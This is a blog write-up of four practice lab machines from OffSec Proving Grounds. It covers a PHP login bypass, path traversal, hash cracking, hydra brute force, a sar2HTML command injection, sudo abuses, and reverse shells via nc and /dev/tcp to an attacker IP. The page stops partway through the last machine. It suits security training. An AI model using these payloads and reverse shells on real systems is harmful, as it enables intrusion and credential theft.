<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="OffSec PG - Potato, PyExp, Sar, Seppukku" /><meta property="og:locale" content="en" /><meta name="description" content="Potato" /><meta property="og:description" content="Potato" /><link rel="canonical" href="https://tanishq.page/blog/posts/oscp-pg-set6/" /><meta property="og:url" content="https://tanishq.page/blog/posts/oscp-pg-set6/" /><meta property="og:site_name" content="Tanishq Rupaal" /><meta property="og:image" content="https://tanishq.page/blog/assets/img/covers/pg-cover.jpeg" /><meta property="og:image:alt" content="PG Artwork" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-12-19T02:00:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://tanishq.page/blog/assets/img/covers/pg-cover.jpeg" /><meta name="twitter:image:alt" content="PG Artwork" /><meta property="twitter:title" content="OffSec PG - Potato, PyExp, Sar, Seppukku" /><meta name="twitter:site" content="@etheriosking" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-12-19T02:00:00-05:00","datePublished":"2021-12-19T02:00:00-05:00","description":"Potato","headline":"OffSec PG - Potato, PyExp, Sar, Seppukku","image":{"alt":"PG Artwork","url":"https://tanishq.page/blog/assets/img/covers/pg-cover.jpeg","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://tanishq.page/blog/posts/oscp-pg-set6/"},"url":"https://tanishq.page/blog/posts/oscp-pg-set6/"}</script><title>OffSec PG - Potato, PyExp, Sar, Seppukku | Tanishq Rupaal</title><link rel="apple-touch-icon" sizes="180x180" href="/blog/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/blog/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/blog/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/blog/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/blog/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tanishq Rupaal"><meta name="application-name" content="Tanishq Rupaal"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/blog/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/blog/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.6.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.29.0/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return 'mode'; } static get MODE_ATTR() { return 'data-mode'; } static get DARK_MODE() { return 'dark'; } static get LIGHT_MODE() { return 'light'; } static get ID() { return 'mode-toggle'; } constructor() { let self = this;this.sysDarkPrefers.addEventListener('change', () => { if (self.hasMode) { self.clearMode(); } self.notify(); }); if (!this.hasMode) { return; } if (this.isDarkMode) { this.setDark(); } else { this.setLight(); } } get sysDarkPrefers() { return window.matchMedia('(prefers-color-scheme: dark)'); } get isPreferDark() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }get modeStatus() { if (this.hasMode) { return this.mode; } else { return this.isPreferDark ? ModeToggle.DARK_MODE : ModeToggle.LIGHT_MODE; } } setDark() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { document.documentElement.removeAttribute(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); }notify() { window.postMessage( { direction: ModeToggle.ID, message: this.modeStatus }, '*' ); } flipMode() { if (this.hasMode) { this.clearMode(); } else { if (this.isPreferDark) { this.setLight(); } else { this.setDark(); } } this.notify(); } } const modeToggle = new ModeToggle(); </script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/blog/" id="avatar" class="rounded-circle"><img src="/blog/assets/Abstract.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a><h1 class="site-title"> <a href="/blog/">Tanishq Rupaal</a></h1><p class="site-subtitle fst-italic mb-0">Cybersecurity Professional</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/blog/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blog/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/blog/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/blog/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/blog/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/tanq16" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/etheriosking" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['dragonking47','proton.me'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://linkedin.com/in/tanishqrupaal" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/blog/">Home</a> </span> <span>OffSec PG - Potato, PyExp, Sar, Seppukku</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1"><header><h1 data-toc-skip>OffSec PG - Potato, PyExp, Sar, Seppukku</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1639897200" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Dec 19, 2021 </time> </span><div class="mt-3 mb-3"> <a href="/blog/assets/img/covers/pg-cover.jpeg" class="popup img-link preview-img shimmer"><img src="/blog/assets/img/covers/pg-cover.jpeg" alt="PG Artwork" width="1200" height="630" loading="lazy"></a><figcaption class="text-center pt-2 pb-2">PG Artwork</figcaption></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/etheriosking">Tanishq Rupaal</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="1600 words" > <em>8 min</em> read</span></div></div></div></header><div class="content"><h2 id="potato"><span class="me-2">Potato</span><a href="#potato" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration"><span class="me-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.53.101</code></p><h4 id="network-scan"><span class="me-2">Network Scan</span><a href="#network-scan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -A -Pn -p- -T4 -o nmap.txt 192.168.53.101</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></p><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>22<td>SSH<td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)<tr><td>80<td>HTTP<td>Apache httpd 2.4.41 ((Ubuntu))<tr><td>2112<td>FTP<td>ProFTPd</table></div><h4 id="web-scan"><span class="me-2">Web Scan</span><a href="#web-scan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>GoBuster scan → <code class="language-plaintext highlighter-rouge">gobuster dir -u http://192.168.53.101 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt</code></p><p>Directories/files listed →</p><ul><li>admin/<li>admin/index.php</ul><h3 id="exploitation"><span class="me-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Used ftp to login to the service running on port 2112, which allowed anonymous login.</p><p>The files available were <code class="language-plaintext highlighter-rouge">index.php.bak</code> and <code class="language-plaintext highlighter-rouge">welcome.msg</code>. The backup of the index page consists of the following code →</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="cp">&lt;?php
$pass= "potato"; //note Change this password regularly
if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  &amp;&amp; strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome! &lt;br&gt; Go to the &lt;a href="dashboard.php"&gt;dashboard&lt;/a&gt;";
    setcookie('pass', $pass, time() + 365*24*3600);
  }else{
    echo "&lt;p&gt;Bad login/password! &lt;br&gt; Return to the &lt;a href="index.php"&gt;login page&lt;/a&gt; &lt;p&gt;";
  }
  exit();
}
?&gt;</span>
  <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"index.php?login=1"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;h1&gt;</span>Login<span class="nt">&lt;/h1&gt;</span>
    <span class="nt">&lt;label&gt;&lt;b&gt;</span>User:<span class="nt">&lt;/b&gt;&lt;/label&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">required</span><span class="nt">&gt;</span>
    <span class="nt">&lt;br&gt;</span>
    <span class="nt">&lt;label&gt;&lt;b&gt;</span>Password:<span class="nt">&lt;/b&gt;&lt;/label&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">name=</span><span class="s">"password"</span> <span class="na">required</span><span class="nt">&gt;</span>
    <span class="nt">&lt;br&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">id=</span><span class="s">'submit'</span> <span class="na">value=</span><span class="s">'Login'</span> <span class="nt">&gt;</span>
  <span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>This gives an idea about how to bypass the login on <code class="language-plaintext highlighter-rouge">/admin/index.php</code> page. The <code class="language-plaintext highlighter-rouge">strcmp($_POST['password'], $pass) == 0)</code> check can be bypassed by changing the parameter <code class="language-plaintext highlighter-rouge">password</code> into <code class="language-plaintext highlighter-rouge">password[]</code> i.e., change it to an array compared to string. That would evaluate to true. Further, the username from the code shows that the required user is admin. Doing the check as stated by intercepting in Burp and changing parameters, a dashboard page at <code class="language-plaintext highlighter-rouge">/admin/dashboard.php</code> is made available.</p><p>The dashboard page has a Logs section that can retrieve logs from the system. This could have a directory traversal i.e., LFI vulnerability. Catching the request in burp and changing the log file to <code class="language-plaintext highlighter-rouge">../../../../../../../../etc/passwd</code> gives the required users from the etc passwd file which have the bash login shell → <code class="language-plaintext highlighter-rouge">root</code>, <code class="language-plaintext highlighter-rouge">florianges</code>, <code class="language-plaintext highlighter-rouge">webadmin</code>.</p><p>The entry of interest is webadmin. The hash is available and seems insecure which can be cracked using John the Ripper. For this, the entry <code class="language-plaintext highlighter-rouge">webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash</code> is stored in a file <code class="language-plaintext highlighter-rouge">test.pass</code> and John is run as follows → <code class="language-plaintext highlighter-rouge">john --wordlist=rockyou.txt test.pass</code>. This revealed the output <code class="language-plaintext highlighter-rouge">dragon</code> which is the password for the webadmin user.</p><p>Used the password <code class="language-plaintext highlighter-rouge">dragon</code> for the user webadmin for ssh as follows → <code class="language-plaintext highlighter-rouge">ssh webadmin@192.168.53.101</code>. This gives the user flag located in the home directory for the user.</p><h3 id="privilege-escalation"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Searched for setuid binaries with command → <code class="language-plaintext highlighter-rouge">find / -perm -u=s -type f 2&gt;/dev/null</code>. Without a usable binary, checked allowed executions with sudo as follows → <code class="language-plaintext highlighter-rouge">sudo -l</code>. This gives the result that the user is allowed to run all commands under <code class="language-plaintext highlighter-rouge">/bin/nice /notes/*</code>.</p><p>The <code class="language-plaintext highlighter-rouge">/notes/</code> directory contained scripts for executing <code class="language-plaintext highlighter-rouge">clear</code> and <code class="language-plaintext highlighter-rouge">id</code> commands. The <code class="language-plaintext highlighter-rouge">*</code> here is a wildcard and can thus be used to bypass the strict controls and use directory traversal technique to execute bash in the elevated state.</p><p>Therefore, executing the <code class="language-plaintext highlighter-rouge">/bin/nice</code> command as follows → <code class="language-plaintext highlighter-rouge">sudo /bin/nice /notes/../bin/bash</code> gives the root shell, followed by the root flag in the root home directory.</p><hr /><h2 id="pyexp"><span class="me-2">PyExp</span><a href="#pyexp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration-1"><span class="me-2">Enumeration</span><a href="#enumeration-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.63.118</code></p><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -A -Pn -p- -T4 -o nmap.txt 192.168.63.118</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></p><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>1337<td>SSH<td>OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<tr><td>3306<td>MySQL<td>MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1 → *Salt: **“(APO{@jw7JP3MgBRU_</table></div><h3 id="exploitation-1"><span class="me-2">Exploitation</span><a href="#exploitation-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Mysql can be brute-forced for a password for the user root. Used hydra for this as follows → <code class="language-plaintext highlighter-rouge">hyda -l root -P rockyou.txt -t 4 mysql://192.168.63.118</code>. The password was <code class="language-plaintext highlighter-rouge">prettywoman</code>. With the new password, looking at mysql databases using the following → <code class="language-plaintext highlighter-rouge">mysql -u root -h 192.168.63.118 -p</code>.</p><p>Looking into the mysql shell, the database is <code class="language-plaintext highlighter-rouge">data</code> and the table is <code class="language-plaintext highlighter-rouge">fernet</code>. The table has the following entry →</p><p>cred → <code class="language-plaintext highlighter-rouge">gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=</code></p><p>keyy → <code class="language-plaintext highlighter-rouge">UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=</code></p><p>The given key and credentials are not any encoding format such as base64, etc. It is in fact fernet. The <code class="language-plaintext highlighter-rouge">cryptography</code> module in python has support for the fernet encryption. This can be decoded as follows using a python script →</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">cryptography.fernet</span> <span class="kn">import</span> <span class="n">Fernet</span>
<span class="n">decryptor</span> <span class="o">=</span> <span class="nc">Fernet</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=</span><span class="sh">'</span><span class="p">)</span>
<span class="n">plaintext</span> <span class="o">=</span> <span class="n">decryptor</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span>
</pre></table></code></div></div><p>Running this as <code class="language-plaintext highlighter-rouge">python3 decrypt.py</code> gives the output as <code class="language-plaintext highlighter-rouge">b'lucy:wJ9</code>“Lemdv9[FEw-‘<code class="language-plaintext highlighter-rouge">. These can be used as the credentials for ssh running on port 1337. Logging in to ssh with the above credentials gives the user </code>lucy` with a user flag in the home directory.</p><h3 id="privilege-escalation-1"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>For privilege escalation, searched set uid binaries using the following find command → <code class="language-plaintext highlighter-rouge">find / -perm -u=s -type f 2&gt;/dev/null</code>. This does show <code class="language-plaintext highlighter-rouge">sudo</code>. Listing commands that can be run by user <code class="language-plaintext highlighter-rouge">lucy</code> by using <code class="language-plaintext highlighter-rouge">sudo -l</code>, the python2 binary can be called for the file <code class="language-plaintext highlighter-rouge">/opt/exp.py</code>.</p><p>The file contains the following code →</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">uinput</span> <span class="o">=</span> <span class="nf">raw_input</span><span class="p">(</span><span class="sh">'</span><span class="s">how are you?</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">exec</span><span class="p">(</span><span class="n">uinput</span><span class="p">)</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">exec()</code> in python2 basically runs python inside it. Therefore, running the above with <code class="language-plaintext highlighter-rouge">sudo /usr/bin/python2 /opt/exp.py</code> and giving input as <code class="language-plaintext highlighter-rouge">import os; os.system(“whoami“);</code> returns <code class="language-plaintext highlighter-rouge">root</code>.</p><p>Therefore, a shell could even be spawned by changing the command, which gives the root flag in the <code class="language-plaintext highlighter-rouge">/root/</code> directory.</p><hr /><h2 id="sar"><span class="me-2">Sar</span><a href="#sar" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration-2"><span class="me-2">Enumeration</span><a href="#enumeration-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.147.35</code></p><h4 id="network-scan-1"><span class="me-2">Network Scan</span><a href="#network-scan-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -A -Pn -p- -T4 -o nmap.txt 192.168.147.35</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></p><h4 id="table"><span class="me-2">Table</span><a href="#table" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>22<td>SSH<td>OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<tr><td>80<td>HTTP<td>Apache httpd 2.4.29 ((Ubuntu))</table></div><h4 id="web-scan-1"><span class="me-2">Web Scan</span><a href="#web-scan-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>GoBuster scan → <code class="language-plaintext highlighter-rouge">gobuster dir -u http://192.168.147.35 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt</code></p><p>Directories/files listed →</p><ul><li>index.html<li>robots.txt<li>phpinfo.php</ul><p>Robots txt reveals a directory <code class="language-plaintext highlighter-rouge">sar2HTML</code>, which has an index.php page. The version for the sar2HTML is 3.2.1.</p><h3 id="exploitation-2"><span class="me-2">Exploitation</span><a href="#exploitation-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Google-fu reveals the existence of an RCE exploit for the sar2HTML version 3.2.1. For this exploit, <code class="language-plaintext highlighter-rouge">/sar2HTML/index.php?plot=;whoami</code> executes the command. The result can be seen on the webpage. Therefore, this was used to enumerate presence of bash, python and netcat. The <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file was also printed which revealed the 2 users of importance to be <code class="language-plaintext highlighter-rouge">root</code> and <code class="language-plaintext highlighter-rouge">love</code>.</p><p>Thus, a reverse shell can be spawned using bash payload <code class="language-plaintext highlighter-rouge">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.49.147 3002 &gt;/tmp/f</code> for the user <code class="language-plaintext highlighter-rouge">www-data</code>.</p><p>The user flag was in the <code class="language-plaintext highlighter-rouge">/home/</code> directory.</p><h3 id="privilege-escalation-2"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Looking at setuid binaries, the most interesting ones are <code class="language-plaintext highlighter-rouge">arping</code> and <code class="language-plaintext highlighter-rouge">ping</code>. Looking at the crontab, there is a process that runs every 5 mins as the root user → <code class="language-plaintext highlighter-rouge">cd /var/www/html/ &amp;&amp; sudo ./finally.sh</code>. Checking the code of the file, it seems that it runs another file called <code class="language-plaintext highlighter-rouge">write.sh</code>, which is world writable.</p><p>Therefore, using a reverse shell payload to get connection from the machine would execute it as root, thereby, giving a root shell.</p><p>This can be done via <code class="language-plaintext highlighter-rouge">echo "/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.49.147/3003 0&gt;&amp;1'" &gt;&gt; write.sh</code>. This gives a shell in 5 minutes. Subsequently, it also gives the root flag.</p><hr /><h2 id="seppukku"><span class="me-2">Seppukku</span><a href="#seppukku" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration-3"><span class="me-2">Enumeration</span><a href="#enumeration-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.244.90</code></p><h4 id="network-scan-2"><span class="me-2">Network Scan</span><a href="#network-scan-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -A -Pn -p- -T4 -o nmap.txt 192.168.141.90</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">os_info</code></p><h4 id="table-1"><span class="me-2">Table</span><a href="#table-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>21<td>FTP<td>vsftpd 3.0.3<tr><td>22<td>SSH<td>OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<tr><td>80<td>HTTP<td>nginx 1.14.2<tr><td>139<td>NETBIOS-SSN<td>Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<tr><td>445<td>MICROSOFT-DS<td>Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)<tr><td>7080<td>SSL/EMPOWERID<td>LiteSpeed<tr><td>7601<td>HTTP<td>Apache httpd 2.4.38 ((Debian))<tr><td>8088<td>HTTP<td>LiteSpeed httpd</table></div><h4 id="web-scan-2"><span class="me-2">Web Scan</span><a href="#web-scan-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>GoBuster scan → <code class="language-plaintext highlighter-rouge">/opt/gobuster dir -u http://192.168.141.90 -f -w /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt</code></p><p>Directories/files listed →</p><ul><li>/index.html<li>/icons/<li>/b/<li>/a/<li>/c/<li>/t/<li>/r/<li>/d/<li>/e/<li>/f/<li>/h/<li>/w/<li>/q/<li>/database/<li>/production/<li>/keys/<li>/secret/</ul><p>The directories <code class="language-plaintext highlighter-rouge">/w/</code>, <code class="language-plaintext highlighter-rouge">secret</code> and <code class="language-plaintext highlighter-rouge">keys</code> contain several interesting files →</p><ul><li>ssh private keys within <code class="language-plaintext highlighter-rouge">private</code> and <code class="language-plaintext highlighter-rouge">private.bak</code><li>hostname file with value <code class="language-plaintext highlighter-rouge">seppuku</code><li>a wordlist <code class="language-plaintext highlighter-rouge">password.lst</code><li><code class="language-plaintext highlighter-rouge">passwd.bak</code> and <code class="language-plaintext highlighter-rouge">shadow.bak</code></ul><h3 id="exploitation-3"><span class="me-2">Exploitation</span><a href="#exploitation-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The wordlist can be used to brute force the ssh login by using hydra as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>hydra <span class="nt">-l</span> seppuku <span class="nt">-P</span> password.lst ssh://192.168.141.90
</pre></table></code></div></div><p>This gives the valid credentials as <code class="language-plaintext highlighter-rouge">seppuku:eeyoree</code> which can be used to login to the machine. This also gives the user flag within <code class="language-plaintext highlighter-rouge">local.txt</code> in the home directory.</p><p>Other items such as the backup for the password and shadow files were rabbit holes due to incorrectly formatted hashes.</p><h3 id="privilege-escalation-3"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="user"><span class="me-2">User</span><a href="#user" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Listing the users in the <code class="language-plaintext highlighter-rouge">/home</code> directory gives other users as <code class="language-plaintext highlighter-rouge">samurai</code> and <code class="language-plaintext highlighter-rouge">tanto</code>. The ssh private keys discovered earlier grant access to user <code class="language-plaintext highlighter-rouge">tanto</code> via ssh. This leads us to a restricted shell. The <code class="language-plaintext highlighter-rouge">sudo -l</code> permissions for the user were to only create a symbolic link of the <code class="language-plaintext highlighter-rouge">/root</code> directory inside <code class="language-plaintext highlighter-rouge">/tmp</code>. However, this directory would still have the permissions of <code class="language-plaintext highlighter-rouge">root</code> which means those permissions are still needed to read the root flag.</p><p>The user directory also contains a <code class="language-plaintext highlighter-rouge">.passwd</code> file which contains a password. This password helps login with credentials <code class="language-plaintext highlighter-rouge">samurai:12345685213456!@!@A</code> for the next user. The <code class="language-plaintext highlighter-rouge">sudo -l</code> capability for this user is to run the following command →</p><div 